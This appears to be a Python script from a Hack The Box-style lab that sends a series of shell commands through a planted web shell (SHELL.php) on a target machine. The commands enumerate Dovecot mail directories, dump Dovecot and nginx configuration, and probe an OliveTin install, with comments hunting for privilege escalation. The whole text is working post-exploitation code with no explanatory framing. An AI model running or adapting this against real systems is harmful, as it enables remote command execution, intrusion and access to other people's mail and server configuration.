import urllib.request, urllib.parse

cmds = [
    "ls -la /var/lib/dovecot/ 2>&1",
    "find /var/lib/dovecot -readable 2>/dev/null | head -30",
    # Check if Dovecot has any world-readable config
    "cat /etc/dovecot/conf.d/10-mail.conf 2>&1 | grep -v '^#' | grep -v '^$' | head -30",
    # Check index/cache locations
    "doveconf -n 2>&1 | head -50",
    # Check if OliveTin's webui directory is accessible via the webserver
    "ls -la /opt/OliveTin/OliveTin-linux-amd64/webui/ 2>&1",
    # Can I reach OliveTin via nginx proxy? Maybe I can configure nginx
    "cat /etc/nginx/sites-enabled/* 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
